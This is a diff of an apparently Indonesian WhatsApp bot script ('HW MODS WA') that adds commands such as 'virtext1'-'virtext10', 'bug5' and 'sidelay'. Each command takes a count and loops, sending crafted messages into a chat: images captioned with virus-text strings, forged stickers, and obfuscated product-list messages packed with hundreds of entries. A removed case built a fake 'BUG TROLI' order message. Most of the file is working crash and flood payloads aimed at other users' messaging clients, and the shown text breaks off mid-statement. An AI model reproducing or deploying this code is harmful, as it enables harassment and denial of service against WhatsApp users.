_0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await haikal[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var order=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+buttonkal,'description':_0x588892(0x1fc)+buttonkal,'thumbnail':virgam,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+buttonkal}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});haikal['relayMessage'](m[_0x588892(0x1f3)],order['message'],{'messageId':order['key']['id']});
 }
 }
 break
@@ -712,34 +532,103 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'troli3': {
+case 'virtext1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
-var troli2 = generateWAMessageFromContent(m.chat,{
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": virgam,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": " BY HW MODS WA ",
-"orderTitle": " BUG TROLI ", // 
-"sellerJid": "6281214281312@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone}` }, { quoted: doc })
 }
-},
-{quoted: {
-key: { 
-fromMe: false, 
-participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
-},
-}, contextInfo:{}}) 
-haikal.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
+}
+break
+case 'virtext2': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone1}` }, { quoted: doc })
+}
+}
+break
+case 'virtext3': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone2}` }, { quoted: doc })
+}
+}
+break
+case 'virtext4': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone3}` }, { quoted: doc })
+}
+}
+break
+case 'virtext5': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone4}` }, { quoted: doc })
+}
+}
+break
+case 'virtext6': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone5}` }, { quoted: doc })
+}
+}
+break
+case 'virtext7': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${iphone6}` }, { quoted: doc })
+}
+}
+break
+case 'virtext8': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${buttonkal}` }, { quoted: doc })
+}
+}
+break
+case 'virtext9': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${buttonvirus}` }, { quoted: doc })
+}
+}
+break
+case 'virtext10': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `HW MODS WA ${ngazap(prefix)}`}, { quoted: doc })
 }
 }
 break
@@ -856,18 +745,54 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "stickerMessage": {
-					"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
-					"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
-					"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
-					"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
-					"mimetype": "image/webp",
-					"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
-					"fileLength": "14240",
-					"mediaKeyTimestamp": "1664991742",
-					"isAnimated": false,
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+}
+break
+case 'bug5': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: doc })
+haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+}
+break
+
+case 'sidelay': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','184726183721626','1847261837216262','PRODUCT_LIST','184726183721626282','7007318245952499','18472618372162628','1847261837216262829','1847261837216262824','8606787pjRFfV','6ohjUEo','18472618372162627','2DjJTeF','10eBrCRT','message','1860208OrcNUm','1303771sMeUPs','1596925gyTSrQ','1847261837216269','HAIKAL','18561433JSLMJl','key','2624412LNDEmX','16vCdaCM'];_0x3b16=function(){return _0x4c72fa;};return _0x3b16();}(function(_0x5e9cd5,_0x1d7d08){var _0x1a0e50=_0x4b8f,_0x1f94ff=_0x5e9cd5();while(!![]){try{var _0x25dc7c=parseInt(_0x1a0e50(0x19a))/0x1+-parseInt(_0x1a0e50(0x196))/0x2*(parseInt(_0x1a0e50(0x1a0))/0x3)+parseInt(_0x1a0e50(0x1a1))/0x4*(-parseInt(_0x1a0e50(0x19b))/0x5)+-parseInt(_0x1a0e50(0x194))/0x6*(-parseInt(_0x1a0e50(0x193))/0x7)+-parseInt(_0x1a0e50(0x199))/0x8+-parseInt(_0x1a0e50(0x1a3))/0x9+-parseInt(_0x1a0e50(0x197))/0xa*(-parseInt(_0x1a0e50(0x19e))/0xb);if(_0x25dc7c===_0x1d7d08)break;else _0x1f94ff['push'](_0x1f94ff['shift']());}catch(_0xcc3c8f){_0x1f94ff['push'](_0x1f94ff['shift']());}}}(_0x3b16,0xb2901));var bugshinchan=generateWAMessageFromContent(m['chat'],proto['Message']['fromObject']({'listMessage':{'title':''+buttonkal,'description':'HW\x20MODS\x20WA'+buttonkal,'buttonText':_0x39080c(0x19d),'listType':_0x39080c(0x18d),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c